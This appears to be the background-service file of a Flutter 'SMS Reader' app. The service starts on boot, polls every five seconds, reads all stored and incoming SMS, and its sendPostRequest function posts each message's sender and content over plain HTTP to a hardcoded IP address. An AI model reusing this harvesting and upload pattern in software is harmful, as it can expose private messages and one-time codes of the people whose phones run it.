import 'dart:async';
import 'dart:convert';
import 'dart:developer';
import 'dart:ui';
import 'package:connectivity/connectivity.dart';
import 'package:flutter/material.dart';
import 'package:flutter_background/flutter_background.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:get/get.dart';
import 'package:notification_reader/NotificationData.dart';
import 'package:notification_reader/notification_reader.dart';
import 'package:sms_reader/auth/model/send_data_model.dart';
import 'package:sms_reader/db/prefs.dart';
import 'package:sms_reader/db/shared_db.dart';
import '../controller/sms_controller.dart';
import 'package:http/http.dart' as http;

//old code

Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  await service.configure(iosConfiguration: IosConfiguration(),
      androidConfiguration: AndroidConfiguration(
          onStart: onStart,
        isForegroundMode: true,
        autoStart: true,
        autoStartOnBoot: true,
      ));

  // final androidConfig = FlutterBackgroundAndroidConfig(
  //   notificationTitle: "flutter_background example app",
  //   notificationText: "Background notification for keeping the example app running in the background",
  //   notificationImportance: AndroidNotificationImportance.Default,
  //   notificationIcon: AndroidResource(name: 'background_icon', defType: 'drawable'), // Default is ic_launcher from folder mipmap
  // );
  //
  // bool success = await FlutterBackground.initialize(androidConfig: androidConfig);
  //
  // log("background success: ${success}");

}

@pragma('vm:entry-point')
void onStart(ServiceInstance serviceInstance)async{
  DartPluginRegistrant.ensureInitialized();
  await initPreferences();
  if(serviceInstance is AndroidServiceInstance){
    serviceInstance.on('setAsForeground').listen((event) {
      serviceInstance.setAsForegroundService();
    });

    serviceInstance.on('setAsBackground').listen((event) {
      serviceInstance.setAsBackgroundService();
    });


    serviceInstance.on('stopService').listen((event) {
      serviceInstance.stopSelf();
    });


    final SmsController smsController =Get.put(SmsController());
    // final AuthController authController =Get.put(AuthController(Get.find()));

    // smsController.incomingSmsList();



    Timer.periodic( const Duration(seconds: 5), (timer) async{

      // Check network connectivity
      final connectivityResult = await Connectivity().checkConnectivity();
      if (connectivityResult == ConnectivityResult.mobile || connectivityResult == ConnectivityResult.wifi) {

        // if(await serviceInstance.isForegroundService()){
        //   serviceInstance.setForegroundNotificationInfo(title: "SMS Reader", content: "Service is running!");
        //   serviceInstance.setAutoStartOnBootMode(true);
        //   // serviceInstance.setAsBackgroundService();
        //   // smsController.incomingSmsList();
        //
        // }

        log('pref value :${Prefs.token.value}');
        if(Prefs.firstTimeLogin.value == true){
            log('first time true');
          smsController.getAllSms(isFromBackground: true);
          Prefs.firstTimeLogin.updateValue(false);
          // Future.delayed(const Duration(seconds: 10),(){
          //   log('first time true');
          //
          //
          // });
          // sendPostRequest(smsController);
        }else{
          log('first time false');
          log('listen service running');
          smsController.initNotificationState();
          smsController.listenIncomingSms(true);
          smsController.getLastSms();

          // log("List of notification: ${smsController.notificationList}");

        }

        log("connection stabilised");
      } else {
        // No network connectivity, handle accordingly
        log('No network connectivity');
        if(await serviceInstance.isForegroundService()){
          serviceInstance.setForegroundNotificationInfo(title: "SMS Reader", content: "You have not internet access!");
          serviceInstance.setAutoStartOnBootMode(true);
          // serviceInstance.setAsBackgroundService();
          // smsController.incomingSmsList();


            // NotificationData res = await NotificationReader.onNotificationRecieve();
            // if (res.body != null) {
            //   // Initialize the titleList with the first notification
            //   setState(() {
            //     titleList.add(res);
            //   });
            //
            //   Timer.periodic(const Duration(seconds: 5), (timer) async {
            //     var newNotification = await NotificationReader.onNotificationRecieve();
            //
            //     // Check if the body of the new notification is not null
            //     if (newNotification.body != null) {
            //       // Update the titleList with the new notification if it's not already present
            //       if (!titleList.contains(newNotification)) {
            //         setState(() {
            //           titleList.add(newNotification);
            //           print("Notification list: $titleList");
            //
            //         });
            //       }
            //     }
            //
            //     // If you want to get the body of the last notification, you can use:
            //     String? lastNotificationBody = titleList.isNotEmpty ? titleList.last.body : "null notify";
            //
            //     if(lastNotificationBody != 'sms reader'){
            //       print("Last Notification Body: $lastNotificationBody");
            //     }else{
            //       print("sms reader last sms : $lastNotificationBody");
            //       titleList.clear();
            //     }
            //
            //   });
            // }
        }
      }


      ///todo --------------------
     if(await serviceInstance.isForegroundService()){
       serviceInstance.setForegroundNotificationInfo(title: "sms", content: "sms reader");
       serviceInstance.setAutoStartOnBootMode(true);
       // serviceInstance.setAsBackgroundService();
       // smsController.incomingSmsList();

     }



    });

  }

}


Future<void> sendPostRequest(SmsController smsController) async {
  final url = Uri.parse('http://18.136.115.162/api/sms/send-all-messages'); // Replace with your API endpoint URL
  smsController.getAllSms(isFromBackground: true);

   List<SendDataModel> myModels= [];
  log("sms list ${smsController.allSmsList}");

  for(var sms in smsController.allSmsList){
    myModels.add(
      SendDataModel(
        sender: sms.address ?? '',
        content: sms.body ?? '',
        recivedSimNumber: "04145",
        simReceivedTimestamp: "2024-01-31T07:30:00Z",
        simName: "Airtel",
      ),
      // Add more instances as needed
    );
  }

  log("mymodel ${myModels}");

  final List<Map<String, dynamic>> jsonDataList = myModels.map((model) => model.toJson()).toList();
  log("mymodel2 ${jsonDataList}");
  log("mymodel3 ${jsonEncode(jsonDataList)}");

  try {
    final response = await http.post(
      url,
      headers: {
        'Content-Type': 'application/json',
        'Authorization' : Prefs.token.value!
      },
      body: jsonEncode(jsonDataList),
    );

    if (response.statusCode == 201 || response.statusCode == 200) {
      print('Response data: ${response.body}');
      print('Success: ');
      myModels.clear();
    } else {
      print('Request failed with status code: ${response.statusCode}');
      print('Response data: ${response.body}');
    }
  } catch (error) {
    print('Error: $error');
  }
}